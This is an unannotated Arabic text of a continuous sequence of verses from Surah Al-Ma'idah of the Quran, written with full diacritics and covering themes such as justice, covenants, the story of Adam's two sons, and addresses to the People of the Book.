يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا كُوْنُوْا قَوّٰمِيْنَ لِلّٰهِ شُهَدَاۤءَ بِالْقِسْطِ ۖ وَلَا يَجْرِمَنَّكُمْ شَنَاٰنُ قَوْمٍ عَلٰٓى اَلَّا تَعْدِلُوْا ۗ اِعْدِلُوْا ۗ هُوَ اَقْرَبُ لِلتَّقْوٰى ۖ وَاتَّقُوا اللّٰهَ ۗ اِنَّ اللّٰهَ خَبِيْرٌۢ بِمَا تَعْمَلُوْنَ
وَعَدَ اللّٰهُ الَّذِيْنَ اٰمَنُوْا وَعَمِلُوا الصّٰلِحٰتِ ۙ لَهُمْ مَّغْفِرَةٌ وَّاَجْرٌ عَظِيْمٌ
وَالَّذِيْنَ كَفَرُوْا وَكَذَّبُوْا بِاٰيٰتِنَآ اُولٰۤىِٕكَ اَصْحٰبُ الْجَحِيْمِ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اذْكُرُوْا نِعْمَتَ اللّٰهِ عَلَيْكُمْ اِذْ هَمَّ قَوْمٌ اَنْ يَّبْسُطُوْٓا اِلَيْكُمْ اَيْدِيَهُمْ فَكَفَّ اَيْدِيَهُمْ عَنْكُمْ ۚ وَاتَّقُوا اللّٰهَ ۗ وَعَلَى اللّٰهِ فَلْيَتَوَكَّلِ الْمُؤْمِنُوْنَ
وَلَقَدْ اَخَذَ اللّٰهُ مِيْثَاقَ بَنِيْٓ اِسْرَاۤءِيْلَ ۚ وَبَعَثْنَا مِنْهُمُ اثْنَيْ عَشَرَ نَقِيْبًا ۗ وَقَالَ اللّٰهُ اِنِّيْ مَعَكُمْ ۗ لَىِٕنْ اَقَمْتُمُ الصَّلٰوةَ وَاٰتَيْتُمُ الزَّكٰوةَ وَاٰمَنْتُمْ بِرُسُلِيْ وَعَزَّرْتُمُوْهُمْ وَاَقْرَضْتُمُ اللّٰهَ قَرْضًا حَسَنًا لَّاُكَفِّرَنَّ عَنْكُمْ سَيِّاٰتِكُمْ وَلَاُدْخِلَنَّكُمْ جَنّٰتٍ تَجْرِيْ مِنْ تَحْتِهَا الْاَنْهٰرُ ۚ فَمَنْ كَفَرَ بَعْدَ ذٰلِكَ مِنْكُمْ فَقَدْ ضَلَّ سَوَاۤءَ السَّبِيْلِ
فَبِمَا نَقْضِهِمْ مِّيْثَاقَهُمْ لَعَنّٰهُمْ وَجَعَلْنَا قُلُوْبَهُمْ قٰسِيَةً ۚ يُحَرِّفُوْنَ الْكَلِمَ عَنْ مَّوَاضِعِهٖ ۙ وَنَسُوْا حَظًّا مِّمَّا ذُكِّرُوْا بِهٖۚ وَلَا تَزَالُ تَطَّلِعُ عَلٰى خَاۤىِٕنَةٍ مِّنْهُمْ اِلَّا قَلِيْلًا مِّنْهُمْ فَاعْفُ عَنْهُمْ وَاصْفَحْ ۗ اِنَّ اللّٰهَ يُحِبُّ الْمُحْسِنِيْنَ
وَمِنَ الَّذِيْنَ قَالُوْٓا اِنَّا نَصٰرٰىٓ اَخَذْنَا مِيْثَاقَهُمْ فَنَسُوْا حَظًّا مِّمَّا ذُكِّرُوْا بِهٖ ۖ فَاَغْرَيْنَا بَيْنَهُمُ الْعَدَاوَةَ وَالْبَغْضَاۤءَ اِلٰى يَوْمِ الْقِيٰمَةِ ۗ وَسَوْفَ يُنَبِّئُهُمُ اللّٰهُ بِمَا كَانُوْا يَصْنَعُوْنَ
يٰٓاَهْلَ الْكِتٰبِ قَدْ جَاۤءَكُمْ رَسُوْلُنَا يُبَيِّنُ لَكُمْ كَثِيْرًا مِّمَّا كُنْتُمْ تُخْفُوْنَ مِنَ الْكِتٰبِ وَيَعْفُوْا عَنْ كَثِيْرٍ ۗ قَدْ جَاۤءَكُمْ مِّنَ اللّٰهِ نُوْرٌ وَّكِتٰبٌ مُّبِيْنٌ
يَّهْدِيْ بِهِ اللّٰهُ مَنِ اتَّبَعَ رِضْوَانَهٗ سُبُلَ السَّلٰمِ وَيُخْرِجُهُمْ مِّنَ الظُّلُمٰتِ اِلَى النُّوْرِ بِاِذْنِهٖ وَيَهْدِيْهِمْ اِلٰى صِرَاطٍ مُّسْتَقِيْمٍ
لَقَدْ كَفَرَ الَّذِيْنَ قَالُوْٓا اِنَّ اللّٰهَ هُوَ الْمَسِيْحُ ابْنُ مَرْيَمَ ۗ قُلْ فَمَنْ يَّمْلِكُ مِنَ اللّٰهِ شَيْـًٔا اِنْ اَرَادَ اَنْ يُّهْلِكَ الْمَسِيْحَ ابْنَ مَرْيَمَ وَاُمَّهٗ وَمَنْ فِى الْاَرْضِ جَمِيْعًا ۗ وَلِلّٰهِ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ وَمَا بَيْنَهُمَا ۗ يَخْلُقُ مَا يَشَاۤءُ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
وَقَالَتِ الْيَهُوْدُ وَالنَّصٰرٰى نَحْنُ اَبْنٰۤؤُا اللّٰهِ وَاَحِبَّاۤؤُهٗ ۗ قُلْ فَلِمَ يُعَذِّبُكُمْ بِذُنُوْبِكُمْ ۗ بَلْ اَنْتُمْ بَشَرٌ مِّمَّنْ خَلَقَ ۗ يَغْفِرُ لِمَنْ يَّشَاۤءُ وَيُعَذِّبُ مَنْ يَّشَاۤءُ ۗ وَلِلّٰهِ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ وَمَا بَيْنَهُمَا ۖ وَاِلَيْهِ الْمَصِيْرُ
يٰٓاَهْلَ الْكِتٰبِ قَدْ جَاۤءَكُمْ رَسُوْلُنَا يُبَيِّنُ لَكُمْ عَلٰى فَتْرَةٍ مِّنَ الرُّسُلِ اَنْ تَقُوْلُوْا مَا جَاۤءَنَا مِنْۢ بَشِيْرٍ وَّلَا نَذِيْرٍ ۖ فَقَدْ جَاۤءَكُمْ بَشِيْرٌ وَّنَذِيْرٌ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
وَاِذْ قَالَ مُوْسٰى لِقَوْمِهٖ يٰقَوْمِ اذْكُرُوْا نِعْمَةَ اللّٰهِ عَلَيْكُمْ اِذْ جَعَلَ فِيْكُمْ اَنْبِۢيَاۤءَ وَجَعَلَكُمْ مُّلُوْكًا ۖ وَّاٰتٰىكُمْ مَّا لَمْ يُؤْتِ اَحَدًا مِّنَ الْعٰلَمِيْنَ
يٰقَوْمِ ادْخُلُوا الْاَرْضَ الْمُقَدَّسَةَ الَّتِيْ كَتَبَ اللّٰهُ لَكُمْ وَلَا تَرْتَدُّوْا عَلٰٓى اَدْبَارِكُمْ فَتَنْقَلِبُوْا خٰسِرِيْنَ
قَالُوْا يٰمُوْسٰىٓ اِنَّ فِيْهَا قَوْمًا جَبَّارِيْنَ ۖ وَاِنَّا لَنْ نَّدْخُلَهَا حَتّٰى يَخْرُجُوْا مِنْهَا ۚ فَاِنْ يَّخْرُجُوْا مِنْهَا فَاِنَّا دٰخِلُوْنَ
قَالَ رَجُلٰنِ مِنَ الَّذِيْنَ يَخَافُوْنَ اَنْعَمَ اللّٰهُ عَلَيْهِمَا ادْخُلُوْا عَلَيْهِمُ الْبَابَ ۚ فَاِذَا دَخَلْتُمُوْهُ فَاِنَّكُمْ غٰلِبُوْنَ ۚ وَعَلَى اللّٰهِ فَتَوَكَّلُوْٓا اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
قَالُوْا يٰمُوْسٰىٓ اِنَّا لَنْ نَّدْخُلَهَآ اَبَدًا مَّا دَامُوْا فِيْهَا فَاذْهَبْ اَنْتَ وَرَبُّكَ فَقَاتِلَآ اِنَّا هٰهُنَا قٰعِدُوْنَ
قَالَ رَبِّ اِنِّيْ لَآ اَمْلِكُ اِلَّا نَفْسِيْ وَاَخِيْ فَافْرُقْ بَيْنَنَا وَبَيْنَ الْقَوْمِ الْفٰسِقِيْنَ
قَالَ فَاِنَّهَا مُحَرَّمَةٌ عَلَيْهِمْ اَرْبَعِيْنَ سَنَةً ۚ يَتِيْهُوْنَ فِى الْاَرْضِ ۗ فَلَا تَأْسَ عَلَى الْقَوْمِ الْفٰسِقِيْنَ
وَاتْلُ عَلَيْهِمْ نَبَاَ ابْنَيْ اٰدَمَ بِالْحَقِّ ۘ اِذْ قَرَّبَا قُرْبَانًا فَتُقُبِّلَ مِنْ اَحَدِهِمَا وَلَمْ يُتَقَبَّلْ مِنَ الْاٰخَرِ ۗ قَالَ لَاَقْتُلَنَّكَ ۗ قَالَ اِنَّمَا يَتَقَبَّلُ اللّٰهُ مِنَ الْمُتَّقِيْنَ
لَىِٕنْۢ بَسَطْتَّ اِلَيَّ يَدَكَ لِتَقْتُلَنِيْ مَآ اَنَا۠ بِبَاسِطٍ يَّدِيَ اِلَيْكَ لِاَقْتُلَكَ ۚ اِنِّيْٓ اَخَافُ اللّٰهَ رَبَّ الْعٰلَمِيْنَ
اِنِّيْٓ اُرِيْدُ اَنْ تَبُوْۤاَ بِاِثْمِيْ وَاِثْمِكَ فَتَكُوْنَ مِنْ اَصْحٰبِ النَّارِ ۚ وَذٰلِكَ جَزٰۤؤُا الظّٰلِمِيْنَ
فَطَوَّعَتْ لَهٗ نَفْسُهٗ قَتْلَ اَخِيْهِ فَقَتَلَهٗ فَاَصْبَحَ مِنَ الْخٰسِرِيْنَ
فَبَعَثَ اللّٰهُ غُرَابًا يَّبْحَثُ فِى الْاَرْضِ لِيُرِيَهٗ كَيْفَ يُوَارِيْ سَوْءَةَ اَخِيْهِ ۗ قَالَ يٰوَيْلَتٰىٓ اَعَجَزْتُ اَنْ اَكُوْنَ مِثْلَ هٰذَا الْغُرَابِ فَاُوَارِيَ سَوْءَةَ اَخِيْ ۚ فَاَصْبَحَ مِنَ النّٰدِمِيْنَ
مِنْ اَجْلِ ذٰلِكَ كَتَبْنَا عَلٰى بَنِيْٓ اِسْرَاۤءِيْلَ اَنَّهٗ مَنْ قَتَلَ نَفْسًاۢ بِغَيْرِ نَفْسٍ اَوْ فَسَادٍ فِى الْاَرْضِ فَكَاَنَّمَا قَتَلَ النَّاسَ جَمِيْعًا ۗ وَمَنْ اَحْيَاهَا فَكَاَنَّمَآ اَحْيَا النَّاسَ جَمِيْعًا ۗ وَلَقَدْ جَاۤءَتْهُمْ رُسُلُنَا بِالْبَيِّنٰتِ ۖ ثُمَّ اِنَّ كَثِيْرًا مِّنْهُمْ بَعْدَ ذٰلِكَ فِى الْاَرْضِ لَمُسْرِفُوْنَ
اِنَّمَا جَزٰۤؤُا الَّذِيْنَ يُحَارِبُوْنَ اللّٰهَ وَرَسُوْلَهٗ وَيَسْعَوْنَ فِى الْاَرْضِ فَسَادًا اَنْ يُّقَتَّلُوْٓا اَوْ يُصَلَّبُوْٓا اَوْ تُقَطَّعَ اَيْدِيْهِمْ وَاَرْجُلُهُمْ مِّنْ خِلَافٍ اَوْ يُنْفَوْا مِنَ الْاَرْضِ ۗ ذٰلِكَ لَهُمْ خِزْيٌ فِى الدُّنْيَا وَلَهُمْ فِى الْاٰخِرَةِ عَذَابٌ عَظِيْمٌ
اِلَّا الَّذِيْنَ تَابُوْا مِنْ قَبْلِ اَنْ تَقْدِرُوْا عَلَيْهِمْ ۚ فَاعْلَمُوْٓا اَنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوا اتَّقُوا اللّٰهَ وَابْتَغُوْٓا اِلَيْهِ الْوَسِيْلَةَ وَجَاهِدُوْا فِيْ سَبِيْلِهٖ لَعَلَّكُمْ تُفْلِحُوْنَ
اِنَّ الَّذِيْنَ كَفَرُوْا لَوْ اَنَّ لَهُمْ مَّا فِى الْاَرْضِ جَمِيْعًا وَّمِثْلَهٗ مَعَهٗ لِيَفْتَدُوْا بِهٖ مِنْ عَذَابِ يَوْمِ الْقِيٰمَةِ مَا تُقُبِّلَ مِنْهُمْ ۚ وَلَهُمْ عَذَابٌ اَلِيْمٌ
يُرِيْدُوْنَ اَنْ يَّخْرُجُوْا مِنَ النَّارِ وَمَا هُمْ بِخٰرِجِيْنَ مِنْهَا ۖ وَلَهُمْ عَذَابٌ مُّقِيْمٌ
وَالسَّارِقُ وَالسَّارِقَةُ فَاقْطَعُوْٓا اَيْدِيَهُمَا جَزَاۤءًۢ بِمَا كَسَبَا نَكَالًا مِّنَ اللّٰهِ ۗ وَاللّٰهُ عَزِيْزٌ حَكِيْمٌ
فَمَنْ تَابَ مِنْۢ بَعْدِ ظُلْمِهٖ وَاَصْلَحَ فَاِنَّ اللّٰهَ يَتُوْبُ عَلَيْهِ ۗ اِنَّ اللّٰهَ غَفُوْرٌ رَّحِيْمٌ
اَلَمْ تَعْلَمْ اَنَّ اللّٰهَ لَهٗ مُلْكُ السَّمٰوٰتِ وَالْاَرْضِ ۗ يُعَذِّبُ مَنْ يَّشَاۤءُ وَيَغْفِرُ لِمَنْ يَّشَاۤءُ ۗ وَاللّٰهُ عَلٰى كُلِّ شَيْءٍ قَدِيْرٌ
يٰٓاَيُّهَا الرَّسُوْلُ لَا يَحْزُنْكَ الَّذِيْنَ يُسَارِعُوْنَ فِى الْكُفْرِ مِنَ الَّذِيْنَ قَالُوْٓا اٰمَنَّا بِاَفْوَاهِهِمْ وَلَمْ تُؤْمِنْ قُلُوْبُهُمْ ۚ وَمِنَ الَّذِيْنَ هَادُوْا ۚ سَمّٰعُوْنَ لِلْكَذِبِ سَمّٰعُوْنَ لِقَوْمٍ اٰخَرِيْنَ ۙ لَمْ يَأْتُوْكَ ۗ يُحَرِّفُوْنَ الْكَلِمَ مِنْۢ بَعْدِ مَوَاضِعِهٖ ۚ يَقُوْلُوْنَ اِنْ اُوْتِيْتُمْ هٰذَا فَخُذُوْهُ وَاِنْ لَّمْ تُؤْتَوْهُ فَاحْذَرُوْا ۗ وَمَنْ يُّرِدِ اللّٰهُ فِتْنَتَهٗ فَلَنْ تَمْلِكَ لَهٗ مِنَ اللّٰهِ شَيْـًٔا ۗ اُولٰۤىِٕكَ الَّذِيْنَ لَمْ يُرِدِ اللّٰهُ اَنْ يُّطَهِّرَ قُلُوْبَهُمْ ۗ لَهُمْ فِى الدُّنْيَا خِزْيٌ ۖ وَّلَهُمْ فِى الْاٰخِرَةِ عَذَابٌ عَظِيْمٌ
سَمّٰعُوْنَ لِلْكَذِبِ اَكّٰلُوْنَ لِلسُّحْتِ ۗ فَاِنْ جَاۤءُوْكَ فَاحْكُمْ بَيْنَهُمْ اَوْ اَعْرِضْ عَنْهُمْ ۚ وَاِنْ تُعْرِضْ عَنْهُمْ فَلَنْ يَّضُرُّوْكَ شَيْـًٔا ۗ وَاِنْ حَكَمْتَ فَاحْكُمْ بَيْنَهُمْ بِالْقِسْطِ ۗ اِنَّ اللّٰهَ يُحِبُّ الْمُقْسِطِيْنَ
وَكَيْفَ يُحَكِّمُوْنَكَ وَعِنْدَهُمُ التَّوْرٰىةُ فِيْهَا حُكْمُ اللّٰهِ ثُمَّ يَتَوَلَّوْنَ مِنْۢ بَعْدِ ذٰلِكَ ۗ وَمَآ اُولٰۤىِٕكَ بِالْمُؤْمِنِيْنَ
اِنَّآ اَنْزَلْنَا التَّوْرٰىةَ فِيْهَا هُدًى وَّنُوْرٌ ۚ يَحْكُمُ بِهَا النَّبِيُّوْنَ الَّذِيْنَ اَسْلَمُوْا لِلَّذِيْنَ هَادُوْا وَالرَّبّٰنِيُّوْنَ وَالْاَحْبَارُ بِمَا اسْتُحْفِظُوْا مِنْ كِتٰبِ اللّٰهِ وَكَانُوْا عَلَيْهِ شُهَدَاۤءَ ۚ فَلَا تَخْشَوُا النَّاسَ وَاخْشَوْنِ وَلَا تَشْتَرُوْا بِاٰيٰتِيْ ثَمَنًا قَلِيْلًا ۗ وَمَنْ لَّمْ يَحْكُمْ بِمَآ اَنْزَلَ اللّٰهُ فَاُولٰۤىِٕكَ هُمُ الْكٰفِرُوْنَ
وَكَتَبْنَا عَلَيْهِمْ فِيْهَآ اَنَّ النَّفْسَ بِالنَّفْسِۙ وَالْعَيْنَ بِالْعَيْنِ وَالْاَنْفَ بِالْاَنْفِ وَالْاُذُنَ بِالْاُذُنِ وَالسِّنَّ بِالسِّنِّۙ وَالْجُرُوْحَ قِصَاصٌ ۗ فَمَنْ تَصَدَّقَ بِهٖ فَهُوَ كَفَّارَةٌ لَّهٗ ۗ وَمَنْ لَّمْ يَحْكُمْ بِمَآ اَنْزَلَ اللّٰهُ فَاُولٰۤىِٕكَ هُمُ الظّٰلِمُوْنَ
وَقَفَّيْنَا عَلٰٓى اٰثَارِهِمْ بِعِيْسَى ابْنِ مَرْيَمَ مُصَدِّقًا لِّمَا بَيْنَ يَدَيْهِ مِنَ التَّوْرٰىةِ ۖ وَاٰتَيْنٰهُ الْاِنْجِيْلَ فِيْهِ هُدًى وَّنُوْرٌ ۙ وَّمُصَدِّقًا لِّمَا بَيْنَ يَدَيْهِ مِنَ التَّوْرٰىةِ وَهُدًى وَّمَوْعِظَةً لِّلْمُتَّقِيْنَ
وَلْيَحْكُمْ اَهْلُ الْاِنْجِيْلِ بِمَآ اَنْزَلَ اللّٰهُ فِيْهِ ۗ وَمَنْ لَّمْ يَحْكُمْ بِمَآ اَنْزَلَ اللّٰهُ فَاُولٰۤىِٕكَ هُمُ الْفٰسِقُوْنَ
وَاَنْزَلْنَآ اِلَيْكَ الْكِتٰبَ بِالْحَقِّ مُصَدِّقًا لِّمَا بَيْنَ يَدَيْهِ مِنَ الْكِتٰبِ وَمُهَيْمِنًا عَلَيْهِ فَاحْكُمْ بَيْنَهُمْ بِمَآ اَنْزَلَ اللّٰهُ وَلَا تَتَّبِعْ اَهْوَاۤءَهُمْ عَمَّا جَاۤءَكَ مِنَ الْحَقِّ ۗ لِكُلٍّ جَعَلْنَا مِنْكُمْ شِرْعَةً وَّمِنْهَاجًا ۗ وَلَوْ شَاۤءَ اللّٰهُ لَجَعَلَكُمْ اُمَّةً وَّاحِدَةً وَّلٰكِنْ لِّيَبْلُوَكُمْ فِيْ مَآ اٰتٰىكُمْ فَاسْتَبِقُوا الْخَيْرٰتِ ۗ اِلَى اللّٰهِ مَرْجِعُكُمْ جَمِيْعًا فَيُنَبِّئُكُمْ بِمَا كُنْتُمْ فِيْهِ تَخْتَلِفُوْنَ
وَاَنِ احْكُمْ بَيْنَهُمْ بِمَآ اَنْزَلَ اللّٰهُ وَلَا تَتَّبِعْ اَهْوَاۤءَهُمْ وَاحْذَرْهُمْ اَنْ يَّفْتِنُوْكَ عَنْۢ بَعْضِ مَآ اَنْزَلَ اللّٰهُ اِلَيْكَ ۗ فَاِنْ تَوَلَّوْا فَاعْلَمْ اَنَّمَا يُرِيْدُ اللّٰهُ اَنْ يُّصِيْبَهُمْ بِبَعْضِ ذُنُوْبِهِمْ ۗ وَاِنَّ كَثِيْرًا مِّنَ النَّاسِ لَفٰسِقُوْنَ
اَفَحُكْمَ الْجَاهِلِيَّةِ يَبْغُوْنَ ۗ وَمَنْ اَحْسَنُ مِنَ اللّٰهِ حُكْمًا لِّقَوْمٍ يُّوْقِنُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَتَّخِذُوا الْيَهُوْدَ وَالنَّصٰرٰىٓ اَوْلِيَاۤءَ ۘ بَعْضُهُمْ اَوْلِيَاۤءُ بَعْضٍ ۗ وَمَنْ يَّتَوَلَّهُمْ مِّنْكُمْ فَاِنَّهٗ مِنْهُمْ ۗ اِنَّ اللّٰهَ لَا يَهْدِى الْقَوْمَ الظّٰلِمِيْنَ
فَتَرَى الَّذِيْنَ فِيْ قُلُوْبِهِمْ مَّرَضٌ يُّسَارِعُوْنَ فِيْهِمْ يَقُوْلُوْنَ نَخْشٰٓى اَنْ تُصِيْبَنَا دَاۤىِٕرَةٌ ۗ فَعَسَى اللّٰهُ اَنْ يَّأْتِيَ بِالْفَتْحِ اَوْ اَمْرٍ مِّنْ عِنْدِهٖ فَيُصْبِحُوْا عَلٰى مَآ اَسَرُّوْا فِيْٓ اَنْفُسِهِمْ نٰدِمِيْنَ
وَيَقُوْلُ الَّذِيْنَ اٰمَنُوْٓا اَهٰٓؤُلَاۤءِ الَّذِيْنَ اَقْسَمُوْا بِاللّٰهِ جَهْدَ اَيْمَانِهِمْ ۙ اِنَّهُمْ لَمَعَكُمْ ۗ حَبِطَتْ اَعْمَالُهُمْ فَاَصْبَحُوْا خٰسِرِيْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا مَنْ يَّرْتَدَّ مِنْكُمْ عَنْ دِيْنِهٖ فَسَوْفَ يَأْتِى اللّٰهُ بِقَوْمٍ اَذِلَّةٍ عَلَى الْمُؤْمِنِيْنَ اَعِزَّةٍ عَلَى الْكٰفِرِيْنَ ۖ يُجَاهِدُوْنَ فِيْ سَبِيْلِ اللّٰهِ وَلَا يَخَافُوْنَ لَوْمَةَ لَاۤىِٕمٍ ۗ ذٰلِكَ فَضْلُ اللّٰهِ يُؤْتِيْهِ مَنْ يَّشَاۤءُ ۗ وَاللّٰهُ وَاسِعٌ عَلِيْمٌ
اِنَّمَا وَلِيُّكُمُ اللّٰهُ وَرَسُوْلُهٗ وَالَّذِيْنَ اٰمَنُوا الَّذِيْنَ يُقِيْمُوْنَ الصَّلٰوةَ وَيُؤْتُوْنَ الزَّكٰوةَ وَهُمْ رٰكِعُوْنَ
وَمَنْ يَّتَوَلَّ اللّٰهَ وَرَسُوْلَهٗ وَالَّذِيْنَ اٰمَنُوْا فَاِنَّ حِزْبَ اللّٰهِ هُمُ الْغٰلِبُوْنَ
يٰٓاَيُّهَا الَّذِيْنَ اٰمَنُوْا لَا تَتَّخِذُوا الَّذِيْنَ اتَّخَذُوْا دِيْنَكُمْ هُزُوًا وَّلَعِبًا مِّنَ الَّذِيْنَ اُوْتُوا الْكِتٰبَ مِنْ قَبْلِكُمْ وَالْكُفَّارَ اَوْلِيَاۤءَ ۚ وَاتَّقُوا اللّٰهَ اِنْ كُنْتُمْ مُّؤْمِنِيْنَ
وَاِذَا نَادَيْتُمْ اِلَى الصَّلٰوةِ اتَّخَذُوْهَا هُزُوًا وَّلَعِبًا ۗ ذٰلِكَ بِاَنَّهُمْ قَوْمٌ لَّا يَعْقِلُوْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ هَلْ تَنْقِمُوْنَ مِنَّآ اِلَّآ اَنْ اٰمَنَّا بِاللّٰهِ وَمَآ اُنْزِلَ اِلَيْنَا وَمَآ اُنْزِلَ مِنْ قَبْلُ ۙ وَاَنَّ اَكْثَرَكُمْ فٰسِقُوْنَ
قُلْ هَلْ اُنَبِّئُكُمْ بِشَرٍّ مِّنْ ذٰلِكَ مَثُوْبَةً عِنْدَ اللّٰهِ ۗ مَنْ لَّعَنَهُ اللّٰهُ وَغَضِبَ عَلَيْهِ وَجَعَلَ مِنْهُمُ الْقِرَدَةَ وَالْخَنَازِيْرَ وَعَبَدَ الطَّاغُوْتَ ۗ اُولٰۤىِٕكَ شَرٌّ مَّكَانًا وَّاَضَلُّ عَنْ سَوَاۤءِ السَّبِيْلِ
وَاِذَا جَاۤءُوْكُمْ قَالُوْٓا اٰمَنَّا وَقَدْ دَّخَلُوْا بِالْكُفْرِ وَهُمْ قَدْ خَرَجُوْا بِهٖ ۗ وَاللّٰهُ اَعْلَمُ بِمَا كَانُوْا يَكْتُمُوْنَ
وَتَرٰى كَثِيْرًا مِّنْهُمْ يُسَارِعُوْنَ فِى الْاِثْمِ وَالْعُدْوَانِ وَاَكْلِهِمُ السُّحْتَ ۗ لَبِئْسَ مَا كَانُوْا يَعْمَلُوْنَ
لَوْلَا يَنْهٰىهُمُ الرَّبّٰنِيُّوْنَ وَالْاَحْبَارُ عَنْ قَوْلِهِمُ الْاِثْمَ وَاَكْلِهِمُ السُّحْتَ ۗ لَبِئْسَ مَا كَانُوْا يَصْنَعُوْنَ
وَقَالَتِ الْيَهُوْدُ يَدُ اللّٰهِ مَغْلُوْلَةٌ ۗ غُلَّتْ اَيْدِيْهِمْ وَلُعِنُوْا بِمَا قَالُوْا ۘ بَلْ يَدٰهُ مَبْسُوْطَتٰنِ ۙ يُنْفِقُ كَيْفَ يَشَاۤءُ ۗ وَلَيَزِيْدَنَّ كَثِيْرًا مِّنْهُمْ مَّآ اُنْزِلَ اِلَيْكَ مِنْ رَّبِّكَ طُغْيَانًا وَّكُفْرًا ۗ وَاَلْقَيْنَا بَيْنَهُمُ الْعَدَاوَةَ وَالْبَغْضَاۤءَ اِلٰى يَوْمِ الْقِيٰمَةِ ۗ كُلَّمَآ اَوْقَدُوْا نَارًا لِّلْحَرْبِ اَطْفَاَهَا اللّٰهُ ۙ وَيَسْعَوْنَ فِى الْاَرْضِ فَسَادًا ۗ وَاللّٰهُ لَا يُحِبُّ الْمُفْسِدِيْنَ
وَلَوْ اَنَّ اَهْلَ الْكِتٰبِ اٰمَنُوْا وَاتَّقَوْا لَكَفَّرْنَا عَنْهُمْ سَيِّاٰتِهِمْ وَلَاَدْخَلْنٰهُمْ جَنّٰتِ النَّعِيْمِ
وَلَوْ اَنَّهُمْ اَقَامُوا التَّوْرٰىةَ وَالْاِنْجِيْلَ وَمَآ اُنْزِلَ اِلَيْهِمْ مِّنْ رَّبِّهِمْ لَاَكَلُوْا مِنْ فَوْقِهِمْ وَمِنْ تَحْتِ اَرْجُلِهِمْ ۗ مِنْهُمْ اُمَّةٌ مُّقْتَصِدَةٌ ۖ وَّكَثِيْرٌ مِّنْهُمْ سَاۤءَ مَا يَعْمَلُوْنَ
يٰٓاَيُّهَا الرَّسُوْلُ بَلِّغْ مَآ اُنْزِلَ اِلَيْكَ مِنْ رَّبِّكَ ۗ وَاِنْ لَّمْ تَفْعَلْ فَمَا بَلَّغْتَ رِسَالَتَهٗ ۗ وَاللّٰهُ يَعْصِمُكَ مِنَ النَّاسِ ۗ اِنَّ اللّٰهَ لَا يَهْدِى الْقَوْمَ الْكٰفِرِيْنَ
قُلْ يٰٓاَهْلَ الْكِتٰبِ لَسْتُمْ عَلٰى شَيْءٍ حَتّٰى تُقِيْمُوا التَّوْرٰىةَ وَالْاِنْجِيْلَ وَمَآ اُنْزِلَ اِلَيْكُمْ مِّنْ رَّبِّكُمْ ۗ وَلَيَزِيْدَنَّ كَثِيْرًا مِّنْهُمْ مَّآ اُنْزِلَ اِلَيْكَ مِنْ رَّبِّكَ طُغْيَانًا وَّكُفْرًا ۚ فَلَا تَأْسَ عَلَى الْقَوْمِ الْكٰفِرِيْنَ
اِنَّ الَّذِيْنَ اٰمَنُوْا وَالَّذِيْنَ هَادُوْا وَالصّٰبِـُٔوْنَ وَالنَّصٰرٰى مَنْ اٰمَنَ بِاللّٰهِ وَالْيَوْمِ الْاٰخِرِ وَعَمِلَ صَالِحًا فَلَا خَوْفٌ عَلَيْهِمْ وَلَا هُمْ يَحْزَنُوْنَ
لَقَدْ اَخَذْنَا مِيْثَاقَ بَنِيْٓ اِسْرَاۤءِيْلَ وَاَرْسَلْنَآ اِلَيْهِمْ رُسُلًا ۗ كُلَّمَا جَاۤءَهُمْ رَسُوْلٌۢ بِمَا لَا تَهْوٰىٓ اَنْفُسُهُمْ فَرِيْقًا كَذَّبُوْا وَفَرِيْقًا يَّقْتُلُوْنَ
وَحَسِبُوْٓا اَلَّا تَكُوْنَ فِتْنَةٌ فَعَمُوْا وَصَمُّوْا ثُمَّ تَابَ اللّٰهُ عَلَيْهِمْ ثُمَّ عَمُوْا وَصَمُّوْا كَثِيْرٌ مِّنْهُمْ ۗ وَاللّٰهُ بَصِيْرٌۢ بِمَا يَعْمَلُوْنَ
لَقَدْ كَفَرَ الَّذِيْنَ قَالُوْٓا اِنَّ اللّٰهَ هُوَ الْمَسِيْحُ ابْنُ مَرْيَمَ ۚ وَقَالَ الْمَسِيْحُ يٰبَنِيْٓ اِسْرَاۤءِيْلَ اعْبُدُوا اللّٰهَ رَبِّيْ وَرَبَّكُمْ ۗ اِنَّهٗ مَنْ يُّشْرِكْ بِاللّٰهِ فَقَدْ حَرَّمَ اللّٰهُ عَلَيْهِ الْجَنَّةَ وَمَأْوٰىهُ النَّارُ ۗ وَمَا لِلظّٰلِمِيْنَ مِنْ اَنْصَارٍ
لَقَدْ كَفَرَ الَّذِيْنَ قَالُوْٓا اِنَّ اللّٰهَ ثَالِثُ ثَلٰثَةٍ ۘ وَمَا مِنْ اِلٰهٍ اِلَّآ اِلٰهٌ وَّاحِدٌ ۗ وَاِنْ لَّمْ يَنْتَهُوْا عَمَّا يَقُوْلُوْنَ لَيَمَسَّنَّ الَّذِيْنَ كَفَرُوْا مِنْهُمْ عَذَابٌ اَلِيْمٌ
اَفَلَا يَتُوْبُوْنَ اِلَى اللّٰهِ وَيَسْتَغْفِرُوْنَهٗ ۗ وَاللّٰهُ غَفُوْرٌ رَّحِيْمٌ
مَا الْمَسِيْحُ ابْنُ مَرْيَمَ اِلَّا رَسُوْلٌ ۚ قَدْ خَلَتْ مِنْ قَبْلِهِ الرُّسُلُ ۗ وَاُمُّهٗ صِدِّيْقَةٌ ۗ كَانَا يَأْكُلٰنِ الطَّعَامَ ۗ اُنْظُرْ كَيْفَ نُبَيِّنُ لَهُمُ الْاٰيٰتِ ثُمَّ انْظُرْ اَنّٰى يُؤْفَكُوْنَ
قُلْ اَتَعْبُدُوْنَ مِنْ دُوْنِ اللّٰهِ مَا لَا يَمْلِكُ لَكُمْ ضَرًّا وَّلَا نَفْعًا ۗ وَاللّٰهُ هُوَ السَّمِيْعُ الْعَلِيْمُ
